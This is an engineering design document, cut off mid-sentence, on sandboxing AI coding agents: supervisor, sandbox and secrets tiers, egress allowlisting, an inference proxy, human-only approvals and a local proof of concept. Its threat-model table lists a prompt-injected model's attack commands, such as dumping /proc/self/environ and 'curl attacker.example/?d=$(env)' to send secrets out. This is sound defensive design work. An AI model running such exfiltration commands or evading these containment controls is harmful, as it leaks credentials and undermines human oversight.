# Design — coding agents: converge on the tasks harness

**Status:** draft + **real harness running a full coding session locally** (uncommitted — see §11). **Owner:** ben.

This is the **runtime topology** half of the "agents that run real code"
story. The companion plan
[`sandboxed-agent-inference.md`](sandboxed-agent-inference.md) covers the
**capability surface** — trust profiles, repo mount semantics, the
artifact channel. This doc covers the layer underneath it: _where_ the
agent loop runs, _what_ trust boundary sits between each piece, and the
security property we're buying. Read them together.

The motivating ask: today the runner is unsandboxed because every tool it
offers is "safe" — a native tool is just a typed function call against
PostHog APIs and can't modify the runner or escape its process. We want
agents that can do far more: run actual code, drive a shell, `git clone`,
run a test suite, edit files on disk. The moment an agent can run
arbitrary code, "the tool can't hurt anything" stops being true.

**The decision this plan commits to:** rather than build a parallel
code-execution tool family inside our runner, we **converge on the tasks
product's harness** (`@posthog/agent` / `agent-server`, running inside a
Modal sandbox and driven over JSON-RPC). The agent loop runs _in the
sandbox_, where the files are. Our runner becomes a supervisor/relay — the
same role the tasks product's Django + Temporal layer plays today. We keep
the platform's existing secrets-bearing custom-tool sandbox and expose it
to the in-sandbox agent over RPC. An in-process agent loop stays on the
table as a _later, optional_ mode (§6), not the thing we build first.

## 1. The core idea — one substrate, three trust tiers

Three execution contexts, each at a different trust level, each on the far
side of a process/VM boundary from the others:

```text
┌──────────────────────────────────────────────────────────────────────┐
│  TIER 1 — Supervisor / relay  (in-process, today's agent-runner)      │
│  • Provisions the sandbox, starts the harness, relays user turns.      │
│  • Brokers permission requests → the approval system.                  │
│  • Streams harness events → the session bus + log_entries.             │
│  • Enforces auth / ACL / limits / cost. Persists the conversation.     │
│  • In the default mode it does NOT run an LLM — the brain moved down.  │
└───────────────┬───────────────────────────────┬──────────────────────┘
                │ JSON-RPC /command              │ (configures via --mcpServers)
                │ (user_message, cancel,         │
                │  close, permission_response)   │
                ▼                                 │
┌──────────────────────────────┐                 │
│  TIER 2 — Coding sandbox      │                 │
│  + agent-server harness       │   MCP / HTTP    │
│  (per-session, disposable)    │  ───────────────┤
│  • Modal VM (Docker in dev).  │                 ▼
│  • Runs the LLM loop LOCALLY  │   ┌──────────────────────────────────┐
│    against the files: shell,  │   │  TIER 3 — Custom-tool sandbox     │
│    git, gh, python/node, rg.  │   │  (per-session, secrets-bearing)   │
│  • Calls the model gateway    │   │  • today's `SandboxPool`          │
│    directly (scoped token).   │   │    (sandbox.ts) — unchanged.      │
│  • agentsh syscall firewall + │   │  • holds the nonce→secret         │
│    egress allowlist.          │   │    substitution boundary.         │
│  • MAY break its OWN sandbox; │   │  • exposed to the harness as an   │
│    blast radius = 1 session.  │   │    MCP server; called over RPC.   │
│  • holds NO tier-3 secrets.   │   │  • secrets NEVER enter tier 2.    │
└──────────────────────────────┘   └──────────────────────────────────┘
```

The names are deliberate:

- **The supervisor (tier 1)** is the same in-process runner we have today,
  minus the LLM in the default mode. It provisions tier 2, relays the
  user's turns into the harness, surfaces the harness's permission
  requests to the approval machinery, and pumps the harness's event stream
  onto the session bus + `log_entries`. Auth, ACL, rate limits, cost caps,
  conversation persistence — all the platform's control-plane concerns
  stay here. This is structurally identical to what the tasks product's
  Django/Temporal layer does (`send_agent_command`,
  `ExecuteSandboxWorkflow`); we're swapping that control plane for the
  agent platform's session queue + triggers + auth.

- **The agent (tier 2)** is the tasks harness — `agent-server` — running
  the LLM loop _inside_ the sandbox, with native filesystem and shell
  tools. It thinks and acts where the files are, so the edit→run→read loop
  has no network tax. It calls the model gateway directly. It may corrupt
  its own workspace; the worst case is one disposable session dies.

- **The keys (tier 3)** is today's custom-tool sandbox, unchanged. Its job
  is to be the only place plaintext customer/integration secrets ever
  materialize. The harness reaches it _only_ as an MCP server over RPC, so
  the coding tier invokes a tool by name and gets a result — never key
  material.

The property we're buying, stated precisely:

> **Custom-tool secret isolation survives full compromise of the coding
> tier.** If the model writes `cat /proc/self/environ`, greps the
> filesystem, or roots the tier-2 sandbox, it still cannot read a
> customer's API key or an integration OAuth token, because those never
> enter tier 2. They live in tier 3, reached only by _name_ through an MCP
> call that returns the _effect_ of using the secret (the Slack message
> got posted, the query ran), never the secret itself.

The brain moving into the sandbox does _not_ mean a real upstream
credential moves with it. The in-sandbox loop reaches the model only
through a **session-scoped inference proxy** (§8): the sandbox holds a
capability token that is worthless anywhere except our proxy, and the
proxy holds the real gateway credential. So the "no real credential in
tier 2" property is universal — it covers customer secrets (tier 3) _and_
model inference.

## 2. Why converge instead of building our own exec tools

The alternative — a `@posthog/sandbox-exec` / `-read-file` / `-write-file`
tool family dispatched from our runner into a sandbox — means
reimplementing, and then maintaining, a coding agent we already have:

- **The harness is mature and battle-tested.** `agent-server` already has
  the tool ecosystem, prompt engineering, todo tracking, sub-agent
  spawning, streaming, and permission hooks of a Claude Code–style agent.
  We'd be re-engineering all of that as platform tools and a second
  prompt loop.
- **No round-trip tax.** A coding agent is chatty with the filesystem
  (read, grep, edit, read, run test, read output). With the loop in the
  sandbox, every one of those is local. Dispatching each as an RPC from
  the runner is the slow path.
- **Native OS tooling, directly.** Inside the sandbox the agent runs `rg`,
  `git`, `pytest`, `gh` as real processes with real streaming, exit codes,
  and signals — no need to model each as a typed RPC command.
- **One substrate, not two.** The tasks product and the agent platform
  stop maintaining divergent sandbox + harness stacks. We share everything
  below `agent-server`'s JSON-RPC line and keep our own control plane above
  it.

The convergence boundary is clean: **share the substrate (sandbox image,
agentsh, agent-server, the JSON-RPC + MCP protocol); keep distinct control
planes (the tasks product's Temporal workflow vs. the agent platform's
session queue, triggers, auth, approvals, bus).**

## 3. The harness — what runs in the sandbox

`agent-server` is the tasks product's in-sandbox agent
(`products/tasks/backend/services/modal_sandbox.py`). The mechanics we
inherit wholesale:

- **Launch.** The supervisor provisions a Modal sandbox per session and
  starts the harness on port 8080
  (`ModalSandbox.start_agent_server`, `AGENT_SERVER_PORT = 8080`):
  `./node_modules/.bin/agent-server --port 8080 [--repositoryPath …]
--taskId … --runId … --mode … [--mcpServers <json>] [--allowedDomains
…]`. Dev uses a Docker container with the same harness on a local port.
- **Authenticated channel.** A Modal **connect token** gives the
  supervisor authenticated HTTPS access to the harness's port
  (`get_connect_credentials` → `create_connect_token()` →
  `AgentServerResult{url, token}`).
- **Command protocol.** JSON-RPC 2.0 to `POST <url>/command`
  (`send_agent_command`, `agent_command.py`). The whitelisted methods are
  exactly what a supervisor needs: `user_message`, `cancel`, `close`,
  `permission_response`, `set_config_option` (`ALLOWED_METHODS` in
  `serializers.py`). We adopt this set verbatim.
- **Event ingest.** The harness streams its activity (assistant text, tool
  calls, results) back out via an event-ingest token
  (`event_ingest_token`, `build_agent_runtime_env_prefix`). This is the
  hook the supervisor taps to drive the session bus + `log_entries`.
- **Network containment.** `agentsh`
  (`products/tasks/backend/services/agentsh.py`) — a syscall-layer
  firewall + DNS proxy (`AGENTSH_DAEMON_PORT = 18080`) — enforces a host
  allowlist at the kernel boundary, so even raw `curl`/`socket` from agent
  code can only reach approved hosts (`INFRASTRUCTURE_DOMAINS`:
  `*.posthog.com`, `api.anthropic.com`, the gateways). `generate_policy_yaml`
  builds the allowlist; we extend it with the spec's declared egress hosts.
- **Secret hiding for tier-2-scoped creds.** The env-restoration pattern
  (`ENV_FILE` / `ENV_WRAPPER_SCRIPT` / `BASH_ENV_SCRIPT`) restores scoped
  env vars (e.g. a branch-scoped git token) at the OS level so they don't
  appear in the agent's transcript, and `BASH_ENV` re-sources a refreshed
  token mid-session. We reuse it unchanged for the _scoped_ creds tier 2
  legitimately holds (§5); high-value secrets stay out of tier 2 entirely.
- **Snapshot / resume.** `ModalSandbox.create_snapshot` snapshots the
  filesystem for session resumption — the substrate for long-running
  coding sessions (§7).

### 3.1 Delivering the platform spec into the harness

A tasks run is repo/PR-shaped; agent-platform agents are not all that
shape. Convergence requires the harness to accept a general coding session
and to be configured from our `AgentSpec` at launch. The mapping:

| `AgentSpec` field          | How it reaches the harness                                                                                       |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| `model`, `reasoning`       | `agent-server` provider/model/reasoning flags (`build_agent_runtime_env_prefix`)                                 |
| system prompt / persona    | harness system-prompt config (rendered from the spec + framework prompt)                                         |
| `skills[]`                 | written into the sandbox workspace at boot (tasks pre-bakes skills into the image; we deliver per-spec)          |
| `tools[].kind == 'custom'` | the tier-3 custom-tool MCP server (§5) added to `--mcpServers`                                                   |
| `mcps[]` (runtime MCPs)    | passed straight through to `--mcpServers` (their `McpServerConfig` shape is already ours)                        |
| `tools[].kind == 'native'` | platform-native tools surfaced via a small built-in MCP server, or kept tier-1-side for the in-process mode (§6) |
| `workspace` (repo/ref)     | `--repositoryPath` + checkout at the pinned ref                                                                  |
| `limits`                   | sandbox wall/CPU/mem + session caps                                                                              |

This is a tidy unification: `spec.mcps[]` already matches the harness's
`--mcpServers` JSON (`McpServerConfig{type,name,url,headers}` in
`temporal/process_task/utils.py`), and `spec.skills[]` already exists in
the platform. The main new build is "render an `AgentSpec` into an
agent-server launch config" — the supervisor's core job.

**Convergence requirement:** `agent-server` must support a fully no-repo,
general-purpose coding session (it already takes an optional
`--repositoryPath`, so this is plausible without a fork). The §3.2 spike
confirms this and the rest of the config surface before we write the
renderer; if a knob is missing we contribute it upstream rather than
forking (we want one harness).

### 3.2 First spike — audit the harness config surface

The plan's biggest soft spot is "how much of an `AgentSpec` can
`agent-server` actually be driven by, and where are the gaps?" The launch
flags are known; the spec-injection path (prompt, skills) is not. Before
writing the renderer (§3.1) or committing to v0, run a short spike against
the `@posthog/agent` / `agent-server` CLI and answer, concretely:

- [ ] **No-repo mode.** Does `agent-server` start and run a session with
      no `--repositoryPath`? What's the minimal viable launch line?
- [ ] **System prompt / persona.** How is the agent's system prompt
      supplied — flag, config file, env, or baked into the package? Can we set
      an _arbitrary_ prompt per session (we need to, from `spec` + the
      framework prompt)?
- [ ] **Skills.** How are skills delivered? Tasks pre-bakes them into the
      image; we need _per-session_ skills from `spec.skills[]`. Does the
      harness read skills from a workspace dir we can populate at boot, or is
      it image-time only?
- [ ] **Model / provider / reasoning.** Confirm
      `build_agent_runtime_env_prefix`'s provider/model/reasoning knobs map
      cleanly to `spec.model` / `spec.reasoning`, and that the model endpoint
      can be pointed at our inference proxy (§8).
- [ ] **MCP tools + gating.** Confirm the `--mcpServers` shape
      (`McpServerConfig{type,name,url,headers}`) and that the permission hook
      (`permission_response`) can gate individual MCP tool calls — the seam
      our approval policy plugs into.
- [ ] **Event ingest.** What does the harness emit over the event-ingest
      channel, in what format? Enough to drive the session bus + `log_entries`
  - per-turn usage reconciliation (§4, §8)?
- [ ] **Native tools.** Can our platform-native tools (`@posthog/query`,
      memory, slack-post) be surfaced as a built-in MCP server the harness
      calls (open q #5), or must they stay tier-1?

**Output:** a `spec field → harness mechanism | gap to contribute` table.
That table _is_ the renderer's spec; the stub is a short write once it
exists. Drafting the renderer before the spike risks encoding guesses.

## 4. The runner as supervisor — how platform concerns map

Moving the loop into the sandbox doesn't lose the platform's control
plane; it relocates it to a relay. Each existing concern maps to a
supervisor responsibility:

- **User turns.** `/run` and `/send` (today's ingress) translate to a
  `user_message` JSON-RPC call into the harness. A queued session that
  resumes restarts/reconnects the harness and replays.
- **Approvals.** The harness raises a permission request when it wants to
  run a gated action (e.g. `git push`); the supervisor receives it,
  drives it through the existing approval queue/resume machinery
  ([`approval-gated-tools.md`](approval-gated-tools.md)), and answers with
  `permission_response`. The harness blocks until answered. The gate is
  the harness's permission hook; the _policy_ and the human-in-the-loop UI
  stay the platform's. (Note: `allow_agent_approver` defaults off — a
  human principal must approve, never the agent.)
- **Observability.** Harness events (assistant text, tool calls, results,
  exit codes, durations) arrive via the event-ingest channel; the
  supervisor fans them onto the `RedisSessionEventBus` (SSE to the chat
  UI) and `KafkaLogSink` (`log_entries`) exactly as it does for in-process
  sessions today. Big payloads (diffs, test logs) go to the artifact
  channel, not the event stream.
- **Conversation persistence.** The supervisor persists the conversation
  after each turn (today's `runSession` behavior) from the harness's
  emitted messages, so resume + the session detail page keep working.
- **Auth / ACL / limits.** Enforced at the gate _before_ a turn reaches
  the harness — `spec.auth`, the session ACL
  ([`per-session-access-elevation.md`](per-session-access-elevation.md)),
  rate limits, and cost caps are all supervisor checks. The harness only
  ever sees turns the supervisor already authorized.
- **Cost.** Token spend now happens inside the harness; the supervisor
  reconciles it from the event-ingest usage stream (a behavior change from
  in-process per-turn capture — see §8 and open q #2).

## 5. Tier 3 — secrets-bearing tools over RPC (the gRPC-style tools we keep)

We keep the existing sandboxed custom tools — the gRPC-style
`invoke({toolId, action, args})` tools that run in their own per-session
sandbox with nonce-substituted secrets (`sandbox.ts`). They are the right
home for "call a customer API with their key", "post to Slack with the
team token", and convergence does **not** replace them. It changes only
_how the agent reaches them_: instead of a tier-1 dispatcher calling
`sandbox.invoke`, the in-sandbox harness calls them as an **MCP server**.

The wiring falls out of what the harness already does. `agent-server`
takes `--mcpServers '[{type,name,url,headers}]'` and connects out over
HTTP (`get_sandbox_ph_mcp_configs`, `get_user_mcp_server_configs`). So:

1. The supervisor stands up (or addresses) an MCP endpoint that fronts the
   tier-3 custom-tool sandbox — a thin **broker** that exposes each
   `spec.tools[].kind == 'custom'` tool as an MCP tool.
2. It adds that endpoint to the harness's `--mcpServers` with a
   short-lived bearer in the headers (the same shape as the PostHog MCP
   config today).
3. When the agent calls the tool, the request goes harness → broker →
   tier-3 sandbox. The secret is resolved through the existing
   nonce/`SecretBroker` substitution boundary **inside tier 3**. The
   harness gets the tool's declared result back. The plaintext secret
   never crosses into tier 2.

This is precisely the "gRPC-style tools, secrets unreachable over RPC"
model — the MCP/HTTP call _is_ the RPC, and the secret stays on the far
side of it. The agent in tier 2 has an MCP tool handle and a scoped bearer
to the broker; it has no route to, and no credential for, the secrets
themselves.

For the low-value, scoped creds tier 2 needs for its _own_ operations
(e.g. a git token scoped to `agents/<slug>/*` so it can push a branch),
we inject the minimum via the env-restoration pattern (§3), which keeps
even those out of the transcript. The bright line: tier 2 may hold a
narrowly-scoped credential for an operation it is itself allowed to
perform; it never holds a general-purpose customer/integration secret.

## 6. The in-process agent — a later, optional mode

Keeping the loop in the trusted tier still has real pull for
**conversational agents with occasional code needs** (a Slack agent that
mostly chats but sometimes runs a query and patches a file): the brain
stays out of the untrusted tier, no model-gateway token lives in the
sandbox, and every code action is a normal tier-1 tool call that reuses
the approval/cost/observability machinery directly. So we keep it — as an
**opt-in mode**, not the default, and not the first thing we build.

`spec.sandbox.loop_location` (illustrative):

- `in_sandbox` (default for code-native agents) — the harness model above.
  The brain runs in tier 2.
- `in_process` (opt-in) — today's `runAgentLoop` runs in the supervisor;
  code actions are dispatched as tool calls to the _same_ tier-2 sandbox
  (now "dumb hands": a command executor, no in-sandbox LLM) and tier-3
  tools are called the way they are today. This is the "hands only" model;
  it pays a round-trip tax per action but keeps the brain trusted.

Both modes use the same tier-2 sandbox and the same tier-3 MCP tools; they
differ only in where the loop lives and therefore whether `agent-server`
runs an LLM or just executes commands. We build `in_sandbox` first (it's
the convergence and the code-native default); `in_process` lands when a
conversational-with-light-code agent makes the trade worth it.

## 7. Composition with the rest of the platform

- **Approvals** — via the harness `permission_response` hook → existing
  approval machinery (§4). No new approval store.
- **Per-session access elevation** — coding sessions are high-value; the
  ACL model applies unchanged at the supervisor gate. `repo-pr`-class
  agents additionally require a write role
  ([`sandboxed-agent-inference.md`](sandboxed-agent-inference.md) §8).
- **Long-running sessions** ([`long-running-sessions.md`](long-running-sessions.md))
  — snapshot the sandbox on suspend (`create_snapshot`), restore on the
  next worker, `git reset --hard <pinned-sha> && git clean -fdx` if state
  looks dirty.
- **Cost capture** (`per-turn-cost-capture.md`) — now two axes: harness
  token spend (reconciled from the event-ingest usage stream) + Modal
  wall-time/CPU/mem. Needs a unified budget + kill switch (open q #2).
- **Observability** (`session-failure-observability.md`) — harness events
  join `log_entries`; harness crash / unhealthy → supervisor surfaces a
  session failure and can re-provision.

## 8. Security review — what an attacker can and can't do

Threat model: assume the model is fully adversarial (prompt-injected or a
hostile author) and achieves arbitrary code execution in tier 2.

| Attack                                                                         | Outcome                                                                                                                                                                                                                           |
| ------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cat /proc/self/environ`, grep the fs for keys                                 | Finds at most a session-bound inference capability token (worthless outside our proxy) and a scoped git token. No real upstream credential — no customer/integration secrets (tier 3), no usable gateway/Anthropic key (§ below). |
| `curl attacker.example/?d=$(env)`                                              | Blocked: agentsh DNS allowlist refuses the host at the syscall layer.                                                                                                                                                             |
| Root / escape the sandbox process                                              | Blast radius is one disposable session VM. No route to tier 1, tier 3, other sessions, or durable state.                                                                                                                          |
| Call a tier-3 custom tool with malicious args to exfil a secret via its output | The tool returns only its declared result; same surface a non-coding agent has today. Coding powers don't widen it.                                                                                                               |
| Talk to tier 3 directly over the network                                       | Only via the brokered MCP endpoint with a scoped bearer; the broker enforces "declared tools only, results not credentials". No raw secret-read path.                                                                             |
| Burn money (fork bomb, model-call loop)                                        | Bounded by per-profile wall/CPU/mem limits + per-team cost cap (open q #2). Sandbox killed on breach.                                                                                                                             |
| Persist across sessions via the Modal volume cache                             | Mitigated by `git reset --hard && git clean -fdx` on acquire + per-session fs namespaces.                                                                                                                                         |

**Model inference goes through a session-scoped proxy — no real gateway
credential in tier 2.** Moving the loop into the sandbox means the
in-sandbox agent calls the LLM itself. We do _not_ hand it the gateway's
per-team `phc_` key (the credential the runner uses against `cmd/gateway`
today, `ai-gateway-model.ts`). Instead we stand up a thin **inference
proxy** and the sandbox talks only to that:

```text
sandbox (agent-server) ──session token──▶ inference proxy ──phc_──▶ ai-gateway ──▶ model
```

- **The token in the sandbox is a capability, not a credential.** A
  short-lived bearer bound to the session — in the simplest form an HMAC
  signature over `{session_id, exp}` the proxy verifies statelessly, so
  there's no token store to manage. It is accepted _only_ by our proxy and
  is useless replayed anywhere else.
- **The proxy holds the real credential and swaps it in.** It validates
  the session token, confirms the session is still live and within budget,
  attaches the real `phc_` (plus the identifying headers
  `ai-gateway-integration.md` wants — distinct-id, trace-id, idempotency),
  and forwards to `cmd/gateway`. The sandbox never sees `phc_`.
- **The proxy is the budget choke point.** Every inference call passes
  through it, so it's the natural place to meter the token-cost axis and
  enforce the per-session / per-team cap — a 402/429 here kills runaway
  model spend instantly, and ending the session invalidates the token with
  no upstream revocation needed. This is the same wallet/budget enforcement
  [`ai-gateway-integration.md`](ai-gateway-integration.md) already wants,
  hosted at the one point tier-2 traffic must cross (open q #2, #6).
- **Egress-pin it.** agentsh permits only the proxy host for model
  traffic, not `cmd/gateway` or `api.anthropic.com` directly. The sandbox
  literally cannot reach the upstream gateway, so a leaked session token
  can't be pointed at it.
- **No data-plane scope.** The session token authorizes inference only; it
  grants no PostHog API / data access — that stays in tier 3 behind the
  custom-tool broker.

Net: the gateway token stops being a special exception to "no real
credentials in tier 2". Inference becomes the same brokered-capability
pattern as tier-3 secrets — a session-bound handle in the sandbox, the
real credential on the far side of an RPC.

Residual risks needing their own controls: prompt-injection steering the
model to approve its own dangerous action (mitigated — approvals require a
human principal, `allow_agent_approver` off), and supply-chain risk in
what the agent installs into its own sandbox (out of scope; disposable +
egress-limited, so blast radius is one session).

## 9. Open questions

1. **Broker placement — resolved: supervisor endpoint behind an
   interface.** The tier-3 MCP broker runs as an endpoint on the
   supervisor that the harness calls back out to (egress-allowlisted via
   agentsh), _not_ as a sidecar, for v0/v1. Rationale: the high-frequency
   actions (read/grep/edit/run) are native in tier 2 and never touch the
   broker; tier-3 tools are the effectful, secret-bearing, mostly
   approval-gated calls — inherently low-frequency, so a network hop is
   negligible. The supervisor endpoint reuses the runner's existing
   `SecretBroker` nonce map, tier-3 sandbox connection, and approval hooks
   with no new deploy unit. A genuine sidecar would also have to live
   _outside_ the tier-2 trust domain (it's on the path to secrets), which
   on Modal collapses back toward "a service near the runner" anyway. Keep
   the broker behind a clean MCP interface; revisit a sidecar only if real
   traffic shows tight tier-3 loops.
2. **Two cost axes + the capture change.** In-process capture metered
   tokens per turn in the runner; now tokens are spent in the harness and
   must be reconciled from the event-ingest usage stream, _plus_ Modal
   wall-time/CPU/mem. Needs a unified per-session/per-team budget and a
   kill switch on either axis. Joint design with
   `rate-limiting-sessions.md` + `per-turn-cost-capture.md`.
3. **Harness config surface** — owned by the §3.2 spike (no-repo mode,
   prompt/skills injection, model/mcp/event-ingest knobs). Its output table
   is the input to the renderer; resolve before v0.
4. **Spec → harness config renderer.** The supervisor's core new
   component, written _after_ the §3.2 spike against the confirmed
   surface. Open until the spike lands.
5. **Native tools in `in_sandbox` mode.** Platform-native tools
   (`@posthog/query`, memory, slack-post) currently run in the runner
   process. In the in-sandbox model do we (a) surface them via a built-in
   MCP server the harness calls, or (b) keep them tier-1 and have the
   harness round-trip? (a) is more consistent; (b) reuses existing code.
   Probably (a) for the data tools, brokered like tier-3.
6. **Inference proxy — build vs. extend the gateway.** §8 puts a
   session-scoped proxy between the sandbox and `cmd/gateway` so no real
   `phc_` lives in tier 2 and budget is enforced at the choke point. Open:
   is this a standalone thin proxy the agent platform owns, or a mode of
   the ai-gateway itself (it already does `phc_` auth + wallet debits)? A
   standalone proxy decouples us and keeps the session-token logic ours; a
   gateway mode avoids a hop. Lean standalone for v0 (smaller blast radius,
   no upstream dependency), revisit if the extra hop's latency bites.
   Either way the sandbox-facing token is a session-bound capability, not a
   gateway credential.
7. **Harness build & versioning.** The harness ships in the sandbox base
   image (`ghcr.io/posthog/posthog-sandbox-base`). How do we roll a
   harness change and detect/refuse a version-skewed harness? Mirror
   `container-builds.md`.
8. **Shared vs forked base image.** Share the tasks product's
   `posthog-sandbox-base` (inherit agentsh version, `@posthog/agent`,
   prebuilt skills) vs. fork. Share for v0; fork only if needs diverge.
9. **Snapshot secret hygiene.** Ensure snapshots don't capture the process
   environment (scoped git/gateway tokens); rotate + re-inject on restore
   rather than reviving stale creds.

## 10. Rollout

**Pre-work — the §3.2 spike.** Audit `agent-server`'s config surface
(no-repo, prompt, skills, model, mcp, event ingest) and produce the
`spec field → harness mechanism | gap` table. Gates v0: the renderer and
the launch path are written against its output.

**v0 — converge on the harness, read-only, internal:**

- Stand up the agent-platform supervisor path: provision a Modal sandbox
  (Docker in dev), start `agent-server`, mint a connect token, relay
  `user_message`, stream events → bus + `log_entries`, drive
  `permission_response` through the approval machinery. Reuse the tasks
  product's Modal + agentsh + connect-token mechanics; share its base
  image.
- Build the `AgentSpec` → `agent-server` launch-config renderer (prompt,
  skills, model, `--mcpServers` for the PostHog MCP, `repo-readonly`-tier
  workspace).
- Persist tier-2 instances to `agent_sandbox_instance` (+ `tier`/`kind`);
  janitor reaps orphans.
- Session-scoped inference proxy (§8): sandbox gets a session-bound
  capability token, proxy holds `phc_` and meters cost. No gateway
  credential in tier 2.
- Ship the canonical "PostHog codebase Q&A" agent end-to-end on the real
  converged substrate.

**v1 — write + PR + the tier-3 secrets-MCP path:**

- `repo-write` / `repo-pr` workspace + the artifact channel.
- Stand up the tier-3 custom-tool MCP broker (§5) and wire it into
  `--mcpServers`: a coding agent that fetches data via a secret-bearing
  custom tool and uses the _result_ in its code, secret provably never in
  tier 2.
- Approval-gating on write/push via `permission_response`.
- Unified two-axis cost budget + kill switch (open q #2).

**v2 — the in-process mode + breadth:**

- `spec.sandbox.loop_location = 'in_process'` (§6) for
  conversational-with-light-code agents: today's `runAgentLoop` in the
  supervisor dispatching commands to the tier-2 sandbox as "dumb hands".
- Native platform tools as a built-in MCP server (open q #5).
- Broaden trust-tier promotion beyond internal (per
  [`sandboxed-agent-inference.md`](sandboxed-agent-inference.md)).

## 11. Validation — local PoC (built, uncommitted)

A working tracer-bullet PoC of the platform half of this plan was built and
run locally with TDD. It validates the topology and the supervisor wiring
against a **real container** with **real shell/fs/JSON-RPC**, faking only
the LLM "brain" (deterministic, offline). It is uncommitted scaffolding to
de-risk the design, not production code.

### What was built

- **Spec extension** — optional `sandbox` config on `AgentSpec`
  (`trust_profile`, `loop_location`, `workspace`); additive + backward
  compatible (all 87 existing spec tests still pass; janitor inherits it via
  the shared `AgentSpecSchema.parse`).
- **`renderLaunchConfig`** (`agent-shared/.../coding/spec-to-launch.ts`) —
  the §3.1 spec → harness-launch mapping, as a pure function. 8 unit tests.
- **Tier-2 contract** (`coding/contract.ts`) — the JSON-RPC command set
  (`user_message`/`cancel`/`close`/`permission_response`/`set_config_option`),
  the pushed event stream, and the MCP-server shape — a faithful subset of
  the tasks product's `agent-server`. This file _is_ the §3.2 contract the
  real harness must satisfy.
- **`DockerCodingSandboxPool`** (`coding/coding-sandbox-docker.ts`) — boots
  one container per session, maps the harness port, health-gates readiness,
  speaks the JSON-RPC channel, reaps on release. Modal slots in behind the
  same interface.
- **`FakeAgentServer`** (`coding/__fixture__/`) — a local stand-in for the
  private `@posthog/agent` harness: real HTTP JSON-RPC, real shell + fs, real
  permission round-trip; deterministic instruction-program "brain" instead of
  an LLM. Ships in a `node:24-slim` image built locally (no private deps).
- **`runCodingSession`** supervisor (`agent-runner/.../coding-supervisor.ts`)
  - event sink (`coding-event-sink.ts`) — the tier-1 relay: acquires the
    sandbox, relays the user turn, pumps the event stream, brokers permission
    requests through an approval callback, returns the outcome. The LLM is _not_
    in this tier.
- **e2e + demo** — real-container tests for the pool (3) and the supervisor
  (2), plus a runnable demo (`agent-runner/bin/coding-demo.ts`) that mounts a
  real host workspace and shows the agent read a file, run `ls`, get a write
  approved, and write `greeting.txt` **to the host fs**. 13 tests green; both
  packages typecheck.

### What it proves

- The three-tier topology works: an in-process supervisor drives a sandboxed
  agent that runs real code, over a clean JSON-RPC + pushed-event contract.
- The **approval round-trip** composes exactly as §4 claims — a gated action
  blocks in the sandbox until the supervisor answers `permission_response`;
  deny blocks the write, allow lets it through.
- The **secret-isolation invariant** (§8) holds by construction: the pool API
  has no channel to inject secrets into tier 2, and an `env`-dump from inside
  the container contains none — enforced by a regression test.
- The supervisor reuses the platform's existing session/event shape, so
  wiring it into the real `runSession`/worker is mechanical, not novel.

### What is still gated (the credential-bound remainder)

- **Live LLM run.** Blocked locally: the real harness (`@posthog/agent`) is a
  private package baked into `ghcr.io/posthog/posthog-sandbox-base` —
  unreachable here (ghcr `:latest` → `manifest unknown`, no ghcr auth;
  `npm install @posthog/agent` fails on corporate TLS interception), and
  there's no model API key. The PoC therefore fakes the brain. The swap is
  well-defined: point `DockerCodingSandboxPool` at `posthog-sandbox-base`,
  point `renderLaunchConfig`'s `modelBaseUrl` at the inference proxy, and the
  same supervisor drives the real agent.
- **Inference proxy, tier-3 MCP broker, Modal backend, snapshot/resume** —
  designed (§3, §5, §8) but not in the PoC.

### Update — full coding session running locally against the real harness

The §3.2 spike is now closed against the **real** published harness, and a
**full coding session runs locally end-to-end**: the real PostHog Code
`agent-server` (`@posthog/agent` 2.3.851, from
`ghcr.io/posthog/posthog-sandbox-base:master`) boots in a local container,
authenticates our minted JWT, opens its session, accepts a `user_message`,
**reasons, makes tool calls, and runs real `Bash` (`ls /tmp/workspace`) in
the sandbox** driven by a live model (`claude-sonnet-4-6`) **proxied through
the local ai-gateway**, to `turn_complete`. (`agent-runner/bin/real-harness-smoke.ts`.)

Confirmed real contract / spike answers:

- **CLI** (`bin.ts`): `--port --mode --repositoryPath --taskId(req) --runId(req)
--mcpServers --createPr --baseBranch --claudeCodeConfig --allowedDomains`.
  No-repo ✅ (defaults `/tmp/workspace`); system prompt ✅ via
  `--claudeCodeConfig {systemPrompt}`; skills/tools ✅ via `--mcpServers`.
- **Auth**: RS256 JWT, `aud: posthog:sandbox_connection`, claims
  `{run_id, task_id, team_id, user_id, distinct_id, mode, exp}`; both
  `/command` and `/events` require `Authorization: Bearer`. Session is
  created by connecting `GET /events` with a matching `run_id`.
- **Model env**: `LLM_GATEWAY_URL` → `ANTHROPIC_BASE_URL`/`OPENAI_BASE_URL`;
  `POSTHOG_PERSONAL_API_KEY` → the gateway token; `POSTHOG_CODE_MODEL`
  picks the model. Required env also: `JWT_PUBLIC_KEY`, `POSTHOG_API_URL`,
  `POSTHOG_PROJECT_ID`.
- **Events**: SSE `GET /events`, frames `{type:'notification',
notification:{jsonrpc, method, params}}` where method is ACP
  (`session/update` with a `sessionUpdate` discriminator:
  `agent_thought_chunk`, `agent_message_chunk`, `tool_call`,
  `tool_call_update`, `usage_update`, …) or `_posthog/*`; plus `connected`
  on open and `_posthog/run_started` / `_posthog/turn_complete`.

Two local-dev gotchas found (and worked around) — neither is an
architecture issue:

1. **`context_window` gap.** The harness GETs `<gateway>/v1/models` and
   hard-requires `context_window` on each entry
   (`base-acp-agent.ts:144`); the local ai-gateway omits it, crashing
   session init. Worked around with a tiny passthrough shim that injects it
   (`agent-runner/bin/gateway-model-meta-shim.cjs`). Proper fix: the
   gateway should return `context_window` (prod presumably does).
2. **Model id format.** The gateway's `/v1/models` lists
   `anthropic/claude-opus-4.8`, but its inference endpoints only route the
   bare provider SKU `claude-sonnet-4-6` (the same form pi-ai/the normal
   runner sends). The harness default `claude-opus-4-8` → `unknown model`;
   set `POSTHOG_CODE_MODEL=claude-sonnet-4-6`.

**Now driven by platform code, not a script.** The pool + supervisor were
refactored onto the real contract and a full coding turn runs through
`runCodingSession` (the actual supervisor + `DockerCodingSandboxPool`)
against the published image via the gateway — covered by
`coding-supervisor.realharness.test.ts` (opt-in: docker + image + local
gateway). Hermetic unit tests cover the tricky parts offline: the ACP
frame parser (`acp-parse.ts`, against captured real frames), the RS256 JWT
minter (`harness-jwt.ts`), and the spec→launch renderer. An example coding
agent is seeded at `services/agent-tests/src/examples/agent-coder/`
(`spec.json` with the `sandbox` block + `agent.md`), validated against
`AgentSpecSchema`.

One real bug worth recording: the harness's `/command` `user_message` is
